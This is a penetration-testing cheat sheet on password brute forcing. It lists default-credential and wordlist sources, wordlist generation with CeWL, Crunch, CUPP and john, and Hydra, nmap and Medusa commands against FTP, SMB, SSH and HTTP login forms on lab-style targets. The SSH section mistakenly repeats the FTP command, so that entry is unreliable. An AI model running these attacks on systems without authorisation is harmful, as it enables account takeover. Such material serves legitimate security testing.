# Brute Forcing

## <mark style="color:red;">Default Credentials</mark> <a href="#default-credentials" id="default-credentials"></a>

* [DefaultPassword](https://default-password.info/)
* [CIRT.net Password DB](https://www.cirt.net/passwords)
* [Default Router Passwords List](https://192-168-1-1ip.mobi/default-router-passwords-list/)

{% hint style="info" %}
Note: [SecLists](https://github.com/danielmiessler/SecLists) and [WordList Compendium](https://github.com/Dormidera/WordList-Compendium) also include default passwords lists.
{% endhint %}

## <mark style="color:red;">Wordlists</mark> <a href="#wordlists" id="wordlists"></a>

* [SecLists - The Pentester’s Companion](https://github.com/danielmiessler/SecLists)
* [Probable Wordlists](https://github.com/berzerk0/Probable-Wordlists)
* [WordList Compendium](https://github.com/Dormidera/WordList-Compendium)
* [Jhaddix Content Discovery All](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
* [Google Fuzzing Forum](https://github.com/google/fuzzing)
* [CrackStation’s Password Cracking Dictionary](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

## <mark style="color:red;">Wordlist Generation</mark> <a href="#wordlist-generation" id="wordlist-generation"></a>

### <mark style="color:blue;">**CeWL**</mark>

```sh
cewl example.com -m 3 -w wordlist.txt
```

<details>

<summary>Parameters</summary>

* `-m <length>`: Minimum word length.
* `-w <file>`: Write the output to `<file>`.

</details>

### <mark style="color:blue;">**Crunch**</mark>

Simple wordlist.

```sh
crunch 6 12 abcdefghijk1234567890\@\! -o wordlist.txt
```

String permutation.

```sh
crunch 1 1 -p target pass 2019 -o wordlist.txt
```

Patterns.

```sh
crunch 9 9 0123456789 -t @target@@ -o wordlist.txt
```

<details>

<summary>Parameters</summary>

* `<min-len>`: The minimum string length.
* `<max-len>`: The maximum string length.
* `<charset>`: Characters set.
* `-o <file>`: Specifies the file to write the output to.
* `-p <charset or strings>`: Permutation.
* `-t <pattern>`: Specifies a pattern, eg: `@@pass@@@@`.
  * `@` will insert lower case characters
  * `,` will insert upper case characters
  * `%` will insert numbers
  * `^` will insert symbols

</details>

## <mark style="color:red;">Password Profiling</mark> <a href="#password-profiling" id="password-profiling"></a>

### <mark style="color:blue;">**CUPP**</mark>

```sh
cupp -i
```

<details>

<summary>Parameters</summary>

* `-i`: Interactive uestions for user password profiling.

</details>

## <mark style="color:red;">Word Mangling</mark> <a href="#word-mangling" id="word-mangling"></a>

### <mark style="color:blue;">**john**</mark>

```sh
john --wordlist=wordlist.txt --rules --stdout
```

<details>

<summary>Parameters</summary>

* `--wordlist <file>`: Wordlist mode, read words from `<file>` or `stdin`.
* `--rules[:CustomRule]`: Enable word mangling rules. Use default or add `[:CustomRule]`.
* `--stdout`: Output candidate passwords.

</details>

{% hint style="info" %}
Note: Custom rules can be appended to John’s configuration file `john.conf`.
{% endhint %}

## <mark style="color:red;">Services</mark> <a href="#services" id="services"></a>

### <mark style="color:blue;">FTP</mark> <a href="#ftp" id="ftp"></a>

Hydra

```sh
hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f 10.0.0.3 ftp
```

<details>

<summary>Parameters</summary>

* `-v`: verbose mode.
* `-l <user>`: login with `user` name.
* `-P <passwords file>`: login with passwords from file.
* `-f`: exit after the first found user/password pair.

</details>

### <mark style="color:blue;">SMB</mark> <a href="#smb" id="smb"></a>

Hydra

```sh
hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt -f 10.0.0.3 smb
```

<details>

<summary>Parameters</summary>

* `-v`: verbose mode.
* `-t <tasks>`: run `<tasks>` number of connects in parallel. Default: 16.
* `-l <user>`: login with `user` name.
* `-P <passwords file>`: login with passwords from file.
* `-f`: exit after the first found user/password pair.

</details>

NSE Script

```sh
sudo nmap --script smb-brute -p U:137,T:139 10.0.0.3
```

### <mark style="color:blue;">SSH</mark> <a href="#ssh" id="ssh"></a>

Hydra

```sh
hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f 10.0.0.3 ftp
```

### <mark style="color:blue;">Web Applications</mark> <a href="#web-applications" id="web-applications"></a>

#### HTTP Basic Auth <a href="#http-basic-auth" id="http-basic-auth"></a>

```sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
```

#### HTTP Digest <a href="#http-digest" id="http-digest"></a>

```sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/
```

#### HTTP POST Form <a href="#http-post-form" id="http-post-form"></a>

```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
```

<details>

<summary>Parameters</summary>

* `-l <user>`: login with `user` name.
* `-L <users-file>`: login with users from file.
* `-P <passwords file>`: login with passwords from file.
* `http-head | http-get | http-post-form`: service to attack.

</details>

#### HTTP Authenticated POST Form <a href="#http-authenticated-post-form" id="http-authenticated-post-form"></a>

To add the session ID to the options string, simply append the Cookie header with the session ID, like so: `:H=Cookie\: security=low; PHPSESSID=if0kg4ss785kmov8bqlbusva3v`

```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
```

### <mark style="color:blue;">Miscellaneous</mark> <a href="#miscellaneous" id="miscellaneous"></a>

#### Combo (Colon Separated) Lists <a href="#combo-colon-separated-lists" id="combo-colon-separated-lists"></a>

Hydra

Use a colon separated `login:pass` format, instead of `-L`/`-P` options.

```sh
hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 10.0.0.3 ftp
```

<details>

<summary>Parameters</summary>

* `-v`: verbose mode.
* `-C <user:pass file>`: colon-separated “login:pass” format.
* `-f`: exit after the first found user/password pair.

</details>

Medusa

The combo files used by Medusa should be in the format host:username:password, separated by colons. If any of these three values are missing, the relevant information should be provided either as a global value or as a list in a separate file.

```sh
sed s/^/:/ /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt > /tmp/cplist.txt
medusa -C /tmp/cplist.txt -h 10.0.0.3 -M ftp
```

<details>

<summary>Parameters</summary>

* `-u <user>`: login with `user` name.
* `-P <passwords file>`: login with password from file.
* `-h`: target hostname or IP address.
* `-M`: module to execute.

</details>

\
